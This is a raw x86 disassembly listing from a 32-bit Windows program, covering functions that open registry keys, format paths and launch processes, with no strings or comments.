  4042d3:	lea    eax,[ebp-0x810]
  4042d9:	push   eax
  4042da:	call   0x404de0
  4042df:	lea    eax,[ebp-0x810]
  4042e5:	push   eax
  4042e6:	lea    ecx,[ebp-0x2034]
  4042ec:	call   0x4054f4
  4042f1:	mov    edx,edi
  4042f3:	mov    BYTE PTR [ebp-0x4],0x6
  4042f7:	lea    ecx,[ebp-0x2034]
  4042fd:	call   0x4045b5
  404302:	mov    BYTE PTR [ebp-0x4],0x2
  404306:	mov    esi,ebx
  404308:	mov    ecx,DWORD PTR [ebp-0x2034]
  40430e:	lea    ecx,[ecx-0x10]
  404311:	call   0x403776
  404316:	mov    BYTE PTR [ebp-0x4],0x1
  40431a:	mov    ecx,DWORD PTR [ebp-0x2038]
  404320:	lea    ecx,[ecx-0x10]
  404323:	call   0x403776
  404328:	mov    BYTE PTR [ebp-0x4],bl
  40432b:	cmp    DWORD PTR [ebp-0x2044],0x0
  404332:	je     0x404346
  404334:	push   DWORD PTR [ebp-0x2044]
  40433a:	call   DWORD PTR ds:0x40a034
  404340:	mov    DWORD PTR [ebp-0x2044],ebx
  404346:	or     DWORD PTR [ebp-0x4],0xffffffff
  40434a:	cmp    DWORD PTR [ebp-0x2030],0x0
  404351:	je     0x404365
  404353:	push   DWORD PTR [ebp-0x2030]
  404359:	call   DWORD PTR ds:0x40a034
  40435f:	mov    DWORD PTR [ebp-0x2030],ebx
  404365:	mov    eax,esi
  404367:	mov    ecx,DWORD PTR [ebp-0xc]
  40436a:	mov    DWORD PTR fs:0x0,ecx
  404371:	pop    ecx
  404372:	pop    edi
  404373:	pop    esi
  404374:	pop    ebx
  404375:	mov    ecx,DWORD PTR [ebp-0x10]
  404378:	xor    ecx,ebp
  40437a:	call   0x407750
  40437f:	mov    esp,ebp
  404381:	pop    ebp
  404382:	ret    
  404383:	int3   
  404384:	int3   
  404385:	int3   
  404386:	int3   
  404387:	int3   
  404388:	push   0x24
  40438a:	mov    eax,0x40822d
  40438f:	call   0x407edc
  404394:	mov    esi,ecx
  404396:	xor    eax,eax
  404398:	mov    ebx,eax
  40439a:	mov    DWORD PTR [ebp-0x1c],ebx
  40439d:	mov    DWORD PTR [ebp-0x24],eax
  4043a0:	mov    DWORD PTR [ebp-0x20],0x4015e4
  4043a7:	cmp    DWORD PTR ds:0x40900c,0x40900c
  4043b1:	je     0x4043bd
  4043b3:	lea    ecx,[ebp-0x24]
  4043b6:	call   0x406eaf
  4043bb:	xor    eax,eax
  4043bd:	mov    DWORD PTR [ebp-0x4],eax
  4043c0:	mov    DWORD PTR [ebp-0x30],eax
  4043c3:	mov    DWORD PTR [ebp-0x2c],eax
  4043c6:	mov    DWORD PTR [ebp-0x28],eax
  4043c9:	lea    eax,[ebp-0x18]
  4043cc:	mov    BYTE PTR [ebp-0x4],0x1
  4043d0:	push   eax
  4043d1:	call   0x404b42
  4043d6:	lea    ecx,[ebp-0x14]
  4043d9:	mov    BYTE PTR [ebp-0x4],0x2
  4043dd:	and    DWORD PTR [ebp-0x14],0x0
  4043e1:	push   ecx
  4043e2:	push   0x20006
  4043e7:	push   0x0
  4043e9:	push   DWORD PTR [eax]
  4043eb:	push   0x80000002
  4043f0:	call   DWORD PTR ds:0x40a024
  4043f6:	mov    edi,eax
  4043f8:	test   edi,edi
  4043fa:	jne    0x404402
  4043fc:	mov    eax,DWORD PTR [ebp-0x14]
  4043ff:	mov    DWORD PTR [ebp-0x30],eax
  404402:	mov    BYTE PTR [ebp-0x4],0x1
  404406:	mov    ecx,DWORD PTR [ebp-0x18]
  404409:	lea    ecx,[ecx-0x10]
  40440c:	call   0x403776
  404411:	test   edi,edi
  404413:	je     0x4044aa
  404419:	lea    eax,[ebp-0x18]
  40441c:	push   eax
  40441d:	call   0x404b42
  404422:	lea    ecx,[ebp-0x14]
  404425:	mov    BYTE PTR [ebp-0x4],0x3
  404429:	push   ecx
  40442a:	push   ecx
  40442b:	push   0x3
  40442d:	push   0x1
  40442f:	push   ecx
  404430:	push   DWORD PTR [eax]
  404432:	lea    ecx,[ebp-0x30]
  404435:	push   0x80000002
  40443a:	call   0x405df9
  40443f:	mov    BYTE PTR [ebp-0x4],0x1
  404443:	mov    ecx,DWORD PTR [ebp-0x18]
  404446:	add    ecx,0xfffffff0
  404449:	mov    DWORD PTR [ebp-0x14],eax
  40444c:	call   0x403776
  404451:	cmp    DWORD PTR [ebp-0x14],0x0
  404455:	je     0x4044aa
  404457:	mov    eax,ds:0x40900c
  40445c:	cmp    eax,0x40900c
  404461:	je     0x404494
  404463:	test   BYTE PTR [eax+0x1c],0x8
  404467:	je     0x404494
  404469:	lea    eax,[ebp-0x18]
  40446c:	push   eax
  40446d:	call   0x404b42
  404472:	mov    BYTE PTR [ebp-0x4],0x4
  404476:	xor    ebx,ebx
  404478:	push   DWORD PTR [ebp-0x14]
  40447b:	inc    ebx
  40447c:	push   DWORD PTR [eax]
  40447e:	mov    eax,ds:0x40900c
  404483:	mov    DWORD PTR [ebp-0x1c],ebx
  404486:	push   DWORD PTR [eax+0x14]
  404489:	push   DWORD PTR [eax+0x10]
  40448c:	push   0x13
  40448e:	pop    ecx
  40448f:	call   0x403900
  404494:	xor    eax,eax
  404496:	inc    eax
  404497:	mov    DWORD PTR [ebp-0x4],eax
  40449a:	test   al,bl
  40449c:	je     0x40452d
  4044a2:	mov    ecx,DWORD PTR [ebp-0x18]
  4044a5:	lea    ecx,[ecx-0x10]
  4044a8:	jmp    0x404528
  4044aa:	push   0x4093c0
  4044af:	lea    ecx,[ebp-0x14]
  4044b2:	call   0x403341
  4044b7:	lea    edx,[esi+0x18]
  4044ba:	mov    BYTE PTR [ebp-0x4],0x5
  4044be:	lea    ecx,[ebp-0x14]
  4044c1:	call   0x40455b
  4044c6:	mov    esi,DWORD PTR [ebp-0x14]
  4044c9:	push   ecx
  4044ca:	push   esi
  4044cb:	push   ecx
  4044cc:	lea    ecx,[ebp-0x30]
  4044cf:	call   0x405e5e
  4044d4:	test   edi,edi
  4044d6:	je     0x4044fb
  4044d8:	mov    eax,ds:0x40900c
  4044dd:	cmp    eax,0x40900c
  4044e2:	je     0x404521
  4044e4:	test   BYTE PTR [eax+0x1c],0x8
  4044e8:	je     0x404521
  4044ea:	push   edi
  4044eb:	push   DWORD PTR [eax+0x14]
  4044ee:	push   DWORD PTR [eax+0x10]
  4044f1:	push   0x14
  4044f3:	pop    ecx
  4044f4:	call   0x403855
  4044f9:	jmp    0x404521
  4044fb:	mov    eax,ds:0x40900c
  404500:	cmp    eax,0x40900c
  404505:	je     0x404521
  404507:	test   BYTE PTR [eax+0x1c],0x10
  40450b:	je     0x404521
  40450d:	push   esi
  40450e:	push   DWORD PTR [eax+0x14]
  404511:	mov    edx,0x4018b4
  404516:	push   DWORD PTR [eax+0x10]
  404519:	push   0x15
  40451b:	pop    ecx
  40451c:	call   0x403882
  404521:	mov    BYTE PTR [ebp-0x4],0x1
  404525:	lea    ecx,[esi-0x10]
  404528:	call   0x403776
  40452d:	mov    BYTE PTR [ebp-0x4],0x0
  404531:	cmp    DWORD PTR [ebp-0x30],0x0
  404535:	je     0x404544
  404537:	push   DWORD PTR [ebp-0x30]
  40453a:	call   DWORD PTR ds:0x40a034
  404540:	and    DWORD PTR [ebp-0x30],0x0
  404544:	or     DWORD PTR [ebp-0x4],0xffffffff
  404548:	lea    ecx,[ebp-0x24]
  40454b:	call   0x406edc
  404550:	call   0x407e9b
  404555:	ret    
  404556:	int3   
  404557:	int3   
  404558:	int3   
  404559:	int3   
  40455a:	int3   
  40455b:	mov    edi,edi
  40455d:	push   ebp
  40455e:	mov    ebp,esp
  404560:	push   ecx
  404561:	push   esi
  404562:	push   edi
  404563:	push   0x4018b0
  404568:	mov    esi,edx
  40456a:	mov    edi,ecx
  40456c:	call   0x40322b
  404571:	mov    eax,DWORD PTR [esi]
  404573:	mov    DWORD PTR [ebp-0x4],eax
  404576:	test   eax,eax
  404578:	je     0x4045aa
  40457a:	mov    eax,DWORD PTR [edi]
  40457c:	cmp    DWORD PTR [eax-0xc],0x0
  404580:	je     0x40458e
  404582:	push   0x401618
  404587:	mov    ecx,edi
  404589:	call   0x40349e
  40458e:	lea    eax,[ebp-0x4]
  404591:	push   eax
  404592:	call   0x405ac9
  404597:	mov    ecx,edi
  404599:	mov    eax,DWORD PTR [eax]
  40459b:	push   DWORD PTR [eax-0xc]
  40459e:	push   eax
  40459f:	call   0x40350c
  4045a4:	cmp    DWORD PTR [ebp-0x4],0x0
  4045a8:	jne    0x40457a
  4045aa:	pop    edi
  4045ab:	pop    esi
  4045ac:	mov    esp,ebp
  4045ae:	pop    ebp
  4045af:	ret    
  4045b0:	int3   
  4045b1:	int3   
  4045b2:	int3   
  4045b3:	int3   
  4045b4:	int3   
  4045b5:	push   0x24
  4045b7:	mov    eax,0x40826d
  4045bc:	call   0x407edc
  4045c1:	mov    ebx,edx
  4045c3:	mov    edi,ecx
  4045c5:	and    DWORD PTR [ebp-0x1c],0x0
  4045c9:	lea    eax,[ebp-0x1c]
  4045cc:	push   eax
  4045cd:	lea    eax,[ebp-0x20]
  4045d0:	mov    DWORD PTR [ebp-0x20],0x2c
  4045d7:	push   eax
  4045d8:	lea    eax,[ebp-0x10]
  4045db:	push   eax
  4045dc:	call   0x40558f
  4045e1:	and    DWORD PTR [ebp-0x4],0x0
  4045e5:	jmp    0x4046a8
  4045ea:	mov    eax,DWORD PTR [ebp-0x10]
  4045ed:	cmp    DWORD PTR [eax-0xc],0x0
  4045f1:	je     0x404679
  4045f7:	push   0x4013d8
  4045fc:	lea    ecx,[ebp-0x14]
  4045ff:	call   0x4054f4
  404604:	mov    BYTE PTR [ebp-0x4],0x1
  404608:	lea    ecx,[ebp-0x14]
  40460b:	mov    eax,DWORD PTR [ebp-0x10]
  40460e:	push   DWORD PTR [eax-0xc]
  404611:	push   eax
  404612:	call   0x40350c
  404617:	xor    ecx,ecx
  404619:	mov    esi,ecx
  40461b:	mov    DWORD PTR [ebp-0x30],esi
  40461e:	mov    DWORD PTR [ebp-0x2c],ecx
  404621:	mov    DWORD PTR [ebp-0x28],ecx
  404624:	lea    eax,[ebp-0x18]
  404627:	mov    BYTE PTR [ebp-0x4],0x2
  40462b:	push   eax
  40462c:	push   0x20019
  404631:	push   ecx
  404632:	push   DWORD PTR [ebp-0x14]
  404635:	mov    DWORD PTR [ebp-0x18],ecx
  404638:	push   0x80000002
  40463d:	call   DWORD PTR ds:0x40a024
  404643:	test   eax,eax
  404645:	jne    0x404657
  404647:	mov    esi,DWORD PTR [ebp-0x18]
  40464a:	mov    ecx,ebx
  40464c:	mov    DWORD PTR [ebp-0x30],esi
  40464f:	push   DWORD PTR [ebp-0x10]
  404652:	call   0x405a43
  404657:	mov    BYTE PTR [ebp-0x4],0x1
  40465b:	test   esi,esi
  40465d:	je     0x40466a
  40465f:	push   esi
  404660:	call   DWORD PTR ds:0x40a034
  404666:	and    DWORD PTR [ebp-0x30],0x0
  40466a:	mov    BYTE PTR [ebp-0x4],0x0
  40466e:	mov    ecx,DWORD PTR [ebp-0x14]
  404671:	lea    ecx,[ecx-0x10]
  404674:	call   0x403776
  404679:	lea    eax,[ebp-0x1c]
  40467c:	mov    ecx,edi
  40467e:	push   eax
  40467f:	lea    eax,[ebp-0x20]
  404682:	push   eax
  404683:	lea    eax,[ebp-0x24]
  404686:	push   eax
  404687:	call   0x40558f
  40468c:	push   eax
  40468d:	lea    ecx,[ebp-0x10]
  404690:	mov    BYTE PTR [ebp-0x4],0x3
  404694:	call   0x40553a
  404699:	mov    BYTE PTR [ebp-0x4],0x0
  40469d:	mov    ecx,DWORD PTR [ebp-0x24]
  4046a0:	lea    ecx,[ecx-0x10]
  4046a3:	call   0x403776
  4046a8:	lea    ecx,[ebp-0x10]
  4046ab:	call   0x40566f
  4046b0:	test   al,al
  4046b2:	jne    0x4045ea
  4046b8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4046bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4046bf:	lea    ecx,[ecx-0x10]
  4046c2:	call   0x403776
  4046c7:	call   0x407e9b
  4046cc:	ret    
  4046cd:	int3   
  4046ce:	int3   
  4046cf:	int3   
  4046d0:	int3   
  4046d1:	int3   
  4046d2:	push   0x220
  4046d7:	mov    eax,0x4082a3
  4046dc:	call   0x407f14
  4046e1:	mov    eax,DWORD PTR [ebp+0xc]
  4046e4:	lea    ecx,[ebp-0x220]
  4046ea:	mov    edi,DWORD PTR [ebp+0x8]
  4046ed:	xor    ebx,ebx
  4046ef:	mov    DWORD PTR [ebp-0x21c],eax
  4046f5:	mov    DWORD PTR [ebp-0x220],ebx
  4046fb:	mov    DWORD PTR [ebp-0x228],ecx
  404701:	mov    DWORD PTR [ebp-0x224],0x40161c
  40470b:	cmp    DWORD PTR ds:0x40900c,0x40900c
  404715:	je     0x404728
  404717:	lea    ecx,[ebp-0x228]
  40471d:	call   0x406eaf
  404722:	mov    eax,DWORD PTR [ebp-0x21c]
  404728:	mov    DWORD PTR [ebp-0x4],ebx
  40472b:	test   edi,edi
  40472d:	je     0x404899
  404733:	cmp    WORD PTR [edi],bx
  404736:	je     0x404899
  40473c:	mov    eax,DWORD PTR [eax+0x10]
  40473f:	mov    ecx,edi
  404741:	mov    DWORD PTR [ebp-0x22c],eax
  404747:	lea    eax,[ebp-0x218]
  40474d:	push   eax
  40474e:	mov    DWORD PTR [ebp-0x218],ebx
  404754:	call   0x405dc5
  404759:	test   eax,eax
  40475b:	js     0x404892
  404761:	mov    eax,DWORD PTR [ebp-0x218]
  404767:	lea    ebx,[eax+0x104]
  40476d:	cmp    ebx,eax
  40476f:	jb     0x404892
  404775:	and    DWORD PTR [ebp-0x218],0x0
  40477c:	push   ebx
  40477d:	lea    ecx,[ebp-0x218]
  404783:	mov    BYTE PTR [ebp-0x4],0x1
  404787:	call   0x402acb
  40478c:	test   al,al
  40478e:	jne    0x40479a
  404790:	mov    edi,0x8007000e
  404795:	jmp    0x404878
  40479a:	push   ebx
  40479b:	push   DWORD PTR [ebp-0x218]
  4047a1:	push   edi
  4047a2:	call   DWORD PTR ds:0x40a064
  4047a8:	mov    edi,eax
  4047aa:	test   edi,edi
  4047ac:	jne    0x4047bb
  4047ae:	call   DWORD PTR ds:0x40a114
  4047b4:	mov    edi,eax
  4047b6:	jmp    0x404860
  4047bb:	cmp    edi,ebx
  4047bd:	jbe    0x4047c9
  4047bf:	mov    edi,0x8007007a
  4047c4:	jmp    0x404878
  4047c9:	mov    eax,DWORD PTR [ebp-0x21c]
  4047cf:	mov    edx,0x4018b0
  4047d4:	mov    ecx,0x4018c4
  4047d9:	mov    al,BYTE PTR [eax+0x2c]
  4047dc:	test   al,al
  4047de:	jne    0x4047e2
  4047e0:	mov    ecx,edx
  4047e2:	mov    eax,DWORD PTR [ebp-0x22c]
  4047e8:	test   eax,eax
  4047ea:	jne    0x4047ee
  4047ec:	mov    eax,edx
  4047ee:	push   ecx
  4047ef:	push   eax
  4047f0:	push   0x401654
  4047f5:	lea    eax,[ebp-0x214]
  4047fb:	push   0x100
  404800:	push   eax
  404801:	call   0x405d14
  404806:	add    esp,0x14
  404809:	lea    eax,[ebp-0x214]
  40480f:	xor    ecx,ecx
  404811:	push   0x5
  404813:	push   ecx
  404814:	push   eax
  404815:	push   DWORD PTR [ebp-0x218]
  40481b:	push   ecx
  40481c:	push   ecx
  40481d:	call   DWORD PTR ds:0x40a128
  404823:	mov    ebx,eax
  404825:	cmp    ebx,0x20
  404828:	jg     0x404876
  40482a:	mov    eax,ds:0x40900c
  40482f:	cmp    eax,0x40900c
  404834:	je     0x404851
  404836:	test   BYTE PTR [eax+0x1c],0x8
  40483a:	je     0x404851
  40483c:	push   ebx
  40483d:	push   DWORD PTR [ebp-0x218]
  404843:	push   DWORD PTR [eax+0x14]
  404846:	push   DWORD PTR [eax+0x10]
  404849:	push   0x16
  40484b:	pop    ecx
  40484c:	call   0x403900
  404851:	cmp    ebx,0x2
  404854:	jl     0x40486f
  404856:	cmp    ebx,0x3
  404859:	jle    0x404860
  40485b:	cmp    ebx,0xb
  40485e:	jne    0x40486f
  404860:	test   edi,edi
  404862:	jle    0x404878
  404864:	movzx  edi,di
  404867:	or     edi,0x80070000
  40486d:	jmp    0x404878
  40486f:	mov    edi,0x80004005
  404874:	jmp    0x404878
  404876:	xor    edi,edi
  404878:	mov    BYTE PTR [ebp-0x4],0x0
  40487c:	push   DWORD PTR [ebp-0x218]
  404882:	call   DWORD PTR ds:0x40a1e8
  404888:	and    DWORD PTR [ebp-0x218],0x0
  40488f:	pop    ecx
  404890:	jmp    0x40489e
  404892:	mov    edi,0x80004005
  404897:	jmp    0x40489e
  404899:	mov    edi,0x80070057
  40489e:	or     DWORD PTR [ebp-0x4],0xffffffff
  4048a2:	lea    ecx,[ebp-0x228]
  4048a8:	call   0x406edc
  4048ad:	mov    eax,edi
  4048af:	call   0x407eb4
  4048b4:	ret    0xc
  4048b7:	int3   
  4048b8:	int3   
  4048b9:	int3   
  4048ba:	int3   
  4048bb:	int3   
  4048bc:	mov    edi,edi
  4048be:	push   ebp
  4048bf:	mov    ebp,esp
  4048c1:	push   ecx
  4048c2:	push   esi
  4048c3:	mov    esi,edx
  4048c5:	and    DWORD PTR [esi],0x0
  4048c8:	call   DWORD PTR ds:0x40a148
  4048ce:	test   eax,eax
  4048d0:	jne    0x4048d9
  4048d2:	mov    eax,0x80004005
  4048d7:	jmp    0x404900
  4048d9:	lea    ecx,[ebp-0x4]
  4048dc:	push   ecx
  4048dd:	push   eax
  4048de:	call   DWORD PTR ds:0x40a14c
  4048e4:	test   eax,eax
  4048e6:	je     0x4048d2
  4048e8:	push   DWORD PTR [ebp-0x4]
  4048eb:	push   0x0
  4048ed:	push   0x80
  4048f2:	call   DWORD PTR ds:0x40a0fc
  4048f8:	mov    DWORD PTR [esi],eax
  4048fa:	test   eax,eax
  4048fc:	je     0x4048d2
  4048fe:	xor    eax,eax
  404900:	pop    esi
  404901:	mov    esp,ebp
  404903:	pop    ebp
  404904:	ret    
  404905:	int3   
  404906:	int3   
  404907:	int3   
  404908:	int3   
  404909:	int3   
  40490a:	push   0x70
  40490c:	mov    eax,0x4082e0
  404911:	call   0x407edc
  404916:	mov    ebx,ecx
  404918:	and    DWORD PTR [ebp-0x1c],0x0
  40491c:	lea    eax,[ebp-0x1c]
  40491f:	push   eax
  404920:	mov    ecx,0x409010
  404925:	call   0x405dc5
  40492a:	test   eax,eax
  40492c:	js     0x404b30
  404932:	mov    eax,DWORD PTR [ebp-0x1c]
  404935:	lea    edi,[eax+0x104]
  40493b:	cmp    edi,eax
  40493d:	jb     0x404b30
  404943:	and    DWORD PTR [ebp-0x14],0x0
  404947:	and    DWORD PTR [ebp-0x4],0x0
  40494b:	lea    ecx,[ebp-0x14]
  40494e:	push   edi
  40494f:	call   0x402acb
  404954:	test   al,al
  404956:	jne    0x404962
  404958:	mov    edi,0x8007000e
  40495d:	jmp    0x404b1a
  404962:	push   edi
  404963:	push   DWORD PTR [ebp-0x14]
  404966:	push   0x409010
  40496b:	call   DWORD PTR ds:0x40a064
  404971:	test   eax,eax
  404973:	jne    0x404993
  404975:	call   DWORD PTR ds:0x40a114
  40497b:	mov    edi,eax
  40497d:	test   edi,edi
  40497f:	jle    0x404b1a
  404985:	movzx  edi,di
  404988:	or     edi,0x80070000
  40498e:	jmp    0x404b1a
  404993:	cmp    eax,edi
  404995:	jbe    0x4049a1
  404997:	mov    edi,0x8007007a
  40499c:	jmp    0x404b1a
  4049a1:	lea    eax,[edi+0x16]
  4049a4:	cmp    eax,edi
  4049a6:	jb     0x404b15
  4049ac:	lea    edi,[eax+0x104]
  4049b2:	cmp    edi,eax
  4049b4:	jb     0x404b15
  4049ba:	and    DWORD PTR [ebp-0x18],0x0
  4049be:	push   edi
  4049bf:	lea    ecx,[ebp-0x18]
  4049c2:	mov    BYTE PTR [ebp-0x4],0x1
  4049c6:	call   0x402acb
  4049cb:	test   al,al
  4049cd:	jne    0x4049d9
  4049cf:	mov    edi,0x8007000e
  4049d4:	jmp    0x404b01
  4049d9:	mov    al,BYTE PTR [ebx+0x2c]
  4049dc:	test   al,al
  4049de:	mov    eax,0x4018c4
  4049e3:	jne    0x4049ea
  4049e5:	mov    eax,0x4018b0
  4049ea:	push   eax
  4049eb:	push   DWORD PTR [ebx]
  4049ed:	push   DWORD PTR [ebp-0x14]
  4049f0:	push   0x401660
  4049f5:	push   edi
  4049f6:	push   DWORD PTR [ebp-0x18]
  4049f9:	call   0x405d14
  4049fe:	add    esp,0x18
  404a01:	test   eax,eax
  404a03:	jns    0x404a0f
  404a05:	mov    edi,0x80004005
  404a0a:	jmp    0x404b01
  404a0f:	push   0x48
  404a11:	pop    edi
  404a12:	push   edi
  404a13:	lea    eax,[ebp-0x7c]
  404a16:	push   0x0
  404a18:	push   eax
  404a19:	call   0x407e84
  404a1e:	and    DWORD PTR [ebp-0x20],0x0
  404a22:	xor    ebx,ebx
  404a24:	and    DWORD PTR [ebp-0x1c],ebx
  404a27:	add    esp,0xc
  404a2a:	mov    DWORD PTR [ebp-0x7c],edi
  404a2d:	xor    edi,edi
  404a2f:	cmp    DWORD PTR [ebp+0x8],ebx
  404a32:	je     0x404aa3
  404a34:	lea    edx,[ebp-0x24]
  404a37:	call   0x4048bc
  404a3c:	test   eax,eax
  404a3e:	js     0x404aa3
  404a40:	lea    eax,[ebp-0x1c]
  404a43:	push   eax
  404a44:	push   ebx
  404a45:	push   0x1
  404a47:	push   ebx
  404a48:	call   DWORD PTR ds:0x40a118
  404a4e:	push   DWORD PTR [ebp-0x1c]
  404a51:	push   ebx
  404a52:	call   DWORD PTR ds:0x40a120
  404a58:	push   eax
  404a59:	call   DWORD PTR ds:0x40a11c
  404a5f:	xor    ecx,ecx
  404a61:	mov    ebx,eax
  404a63:	test   ebx,ebx
  404a65:	setne  cl
  404a68:	test   ecx,ecx
  404a6a:	je     0x404aa3
  404a6c:	lea    eax,[ebp-0x1c]
  404a6f:	push   eax
  404a70:	push   edi
  404a71:	push   0x1
  404a73:	push   ebx
  404a74:	call   DWORD PTR ds:0x40a118
  404a7a:	test   eax,eax
  404a7c:	je     0x404aa3
  404a7e:	xor    ecx,ecx
  404a80:	mov    DWORD PTR [ebp-0x20],0x1
  404a87:	push   ecx
  404a88:	push   ecx
  404a89:	push   0x4
  404a8b:	lea    eax,[ebp-0x24]
  404a8e:	push   eax
  404a8f:	push   0x20000
  404a94:	push   ecx
  404a95:	push   ebx
  404a96:	call   DWORD PTR ds:0x40a0c8
  404a9c:	test   eax,eax
  404a9e:	je     0x404aa3
  404aa0:	mov    DWORD PTR [ebp-0x38],ebx
  404aa3:	lea    eax,[ebp-0x34]
  404aa6:	push   eax
  404aa7:	lea    eax,[ebp-0x7c]
  404aaa:	push   eax
  404aab:	xor    eax,eax
  404aad:	push   eax
  404aae:	push   eax
  404aaf:	push   0x1080000
  404ab4:	push   eax
  404ab5:	push   eax
  404ab6:	push   eax
  404ab7:	push   DWORD PTR [ebp-0x18]
  404aba:	push   DWORD PTR [ebp-0x14]
  404abd:	call   DWORD PTR ds:0x40a0c4
  404ac3:	test   eax,eax
  404ac5:	je     0x404adb
  404ac7:	push   DWORD PTR [ebp-0x34]
  404aca:	call   DWORD PTR ds:0x40a05c
  404ad0:	push   DWORD PTR [ebp-0x30]
  404ad3:	call   DWORD PTR ds:0x40a05c
  404ad9:	jmp    0x404ae0
  404adb:	mov    edi,0x80004005
  404ae0:	cmp    DWORD PTR [ebp-0x20],0x0
  404ae4:	je     0x404aed
  404ae6:	push   ebx
  404ae7:	call   DWORD PTR ds:0x40a0c0
  404aed:	test   ebx,ebx
  404aef:	je     0x404b01
  404af1:	push   ebx
  404af2:	push   0x0
  404af4:	call   DWORD PTR ds:0x40a120
  404afa:	push   eax
  404afb:	call   DWORD PTR ds:0x40a0bc
  404b01:	mov    BYTE PTR [ebp-0x4],0x0
  404b05:	push   DWORD PTR [ebp-0x18]
  404b08:	call   DWORD PTR ds:0x40a1e8
  404b0e:	and    DWORD PTR [ebp-0x18],0x0
  404b12:	pop    ecx
  404b13:	jmp    0x404b1a
  404b15:	mov    edi,0x80004005
  404b1a:	or     DWORD PTR [ebp-0x4],0xffffffff
  404b1e:	push   DWORD PTR [ebp-0x14]
  404b21:	call   DWORD PTR ds:0x40a1e8
  404b27:	and    DWORD PTR [ebp-0x14],0x0
  404b2b:	mov    eax,edi
  404b2d:	pop    ecx
  404b2e:	jmp    0x404b35
  404b30:	mov    eax,0x80004005
  404b35:	call   0x407e9b
  404b3a:	ret    0x4
  404b3d:	int3   
  404b3e:	int3   
  404b3f:	int3   
  404b40:	int3   
  404b41:	int3   
  404b42:	push   0x28
  404b44:	mov    eax,0x408319
  404b49:	call   0x407f14
  404b4e:	mov    esi,DWORD PTR [ebp+0x8]
  404b51:	lea    eax,[ebp-0x2c]
  404b54:	xor    edi,edi
  404b56:	mov    DWORD PTR [ebp-0x4],edi
  404b59:	mov    DWORD PTR [ebp-0x30],edi
  404b5c:	push   eax
  404b5d:	mov    DWORD PTR [ebp-0x34],esi
  404b60:	mov    DWORD PTR [ebp-0x2c],edi
  404b63:	call   DWORD PTR ds:0x40a0e4
  404b69:	push   eax
  404b6a:	call   DWORD PTR ds:0x40a0f8
  404b70:	push   0x401680
  404b75:	mov    ecx,esi
  404b77:	call   0x4054f4
  404b7c:	push   0xa
  404b7e:	push   0xc
  404b80:	lea    eax,[ebp-0x28]
  404b83:	mov    DWORD PTR [ebp-0x4],edi
  404b86:	push   eax
  404b87:	push   DWORD PTR [ebp-0x2c]
  404b8a:	mov    DWORD PTR [ebp-0x30],0x1
  404b91:	call   DWORD PTR ds:0x40a1f4
  404b97:	add    esp,0x10
  404b9a:	lea    eax,[ebp-0x28]
  404b9d:	mov    ecx,esi
  404b9f:	push   eax
  404ba0:	call   0x40349e
  404ba5:	mov    eax,esi
  404ba7:	call   0x407eb4
  404bac:	ret    0x4
  404baf:	int3   
  404bb0:	int3   
  404bb1:	int3   
  404bb2:	int3   
  404bb3:	int3   
  404bb4:	push   0x1c
  404bb6:	mov    eax,0x408373
  404bbb:	call   0x407edc
  404bc0:	xor    ebx,ebx
  404bc2:	mov    DWORD PTR [ebp-0x18],0x401708
  404bc9:	mov    DWORD PTR [ebp-0x1c],ebx
  404bcc:	mov    edi,0x40900c
  404bd1:	cmp    DWORD PTR ds:0x40900c,edi
  404bd7:	je     0x404be1
  404bd9:	lea    ecx,[ebp-0x1c]
  404bdc:	call   0x406eaf
  404be1:	mov    DWORD PTR [ebp-0x4],ebx
  404be4:	mov    DWORD PTR [ebp-0x28],ebx
  404be7:	mov    DWORD PTR [ebp-0x24],ebx
  404bea:	mov    DWORD PTR [ebp-0x20],ebx
  404bed:	push   0x4093c0
  404bf2:	lea    ecx,[ebp-0x10]
  404bf5:	mov    BYTE PTR [ebp-0x4],0x1
  404bf9:	call   0x403341
  404bfe:	lea    eax,[ebp-0x14]
  404c01:	mov    BYTE PTR [ebp-0x4],0x2
  404c05:	push   eax
  404c06:	call   0x404b42
  404c0b:	push   eax
  404c0c:	lea    ecx,[ebp-0x10]
  404c0f:	mov    BYTE PTR [ebp-0x4],0x3
  404c13:	call   0x40553a
  404c18:	mov    BYTE PTR [ebp-0x4],0x2
  404c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  404c1f:	lea    ecx,[ecx-0x10]
  404c22:	call   0x403776
  404c27:	lea    ecx,[ebp-0x10]
  404c2a:	call   0x4056dc
  404c2f:	push   eax
  404c30:	lea    ecx,[ebp-0x14]
  404c33:	call   0x403341
  404c38:	mov    eax,0x401740
  404c3d:	mov    BYTE PTR [ebp-0x4],0x4
  404c41:	lea    ecx,[ebp-0x14]
  404c44:	test   eax,0xffff0000
  404c49:	jne    0x404c56
  404c4b:	movzx  eax,ax
  404c4e:	push   eax
  404c4f:	call   0x4057f6
  404c54:	jmp    0x404c5c
  404c56:	push   eax
  404c57:	call   0x40326d
  404c5c:	mov    BYTE PTR [ebp-0x4],0x5
  404c60:	lea    ecx,[ebp-0x10]
  404c63:	mov    esi,DWORD PTR [ebp-0x14]
  404c66:	push   DWORD PTR [esi-0xc]
  404c69:	push   esi
  404c6a:	call   0x40350c
  404c6f:	lea    ecx,[esi-0x10]
  404c72:	mov    BYTE PTR [ebp-0x4],0x2
  404c76:	call   0x403776
  404c7b:	push   0x409058
  404c80:	lea    ecx,[ebp-0x10]
  404c83:	call   0x40349e
  404c88:	mov    esi,DWORD PTR [ebp-0x10]
  404c8b:	lea    eax,[ebp-0x14]
  404c8e:	push   eax
  404c8f:	push   0x20006
  404c94:	push   ebx
  404c95:	push   esi
  404c96:	push   0x80000002
  404c9b:	mov    DWORD PTR [ebp-0x14],ebx
  404c9e:	call   DWORD PTR ds:0x40a024
  404ca4:	test   eax,eax
  404ca6:	jne    0x404cb3
  404ca8:	mov    edi,DWORD PTR [ebp-0x14]
  404cab:	xor    ebx,ebx
  404cad:	mov    DWORD PTR [ebp-0x28],edi
  404cb0:	inc    ebx
  404cb1:	jmp    0x404cf2
  404cb3:	lea    eax,[ebp-0x14]
  404cb6:	push   eax
  404cb7:	push   ecx
  404cb8:	push   0x3
  404cba:	push   0x1
  404cbc:	push   ecx
  404cbd:	push   esi
  404cbe:	push   0x80000002
  404cc3:	lea    ecx,[ebp-0x28]
  404cc6:	call   0x405df9
  404ccb:	test   eax,eax
  404ccd:	je     0x404cef
  404ccf:	mov    ecx,DWORD PTR ds:0x40900c
  404cd5:	cmp    ecx,edi
  404cd7:	je     0x404cef
  404cd9:	test   BYTE PTR [ecx+0x1c],0x8
  404cdd:	je     0x404cef
  404cdf:	push   eax
  404ce0:	push   esi
